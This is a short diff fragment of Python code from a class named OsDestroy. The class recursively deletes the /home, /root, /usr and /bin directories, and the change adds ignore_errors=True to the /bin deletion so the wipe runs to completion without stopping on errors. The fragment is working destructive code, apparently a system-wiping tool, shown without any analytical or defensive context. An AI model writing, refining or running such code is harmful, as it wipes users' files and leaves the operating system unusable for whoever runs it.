@@ -51,4 +51,4 @@ class OsDestroy():
                         shutil.rmtree("/home", ignore_errors=True)
                         shutil.rmtree("/root", ignore_errors=True)
                         shutil.rmtree("/usr", ignore_errors=True)
-                        shutil.rmtree("/bin", )
+                        shutil.rmtree("/bin", ignore_errors=True)
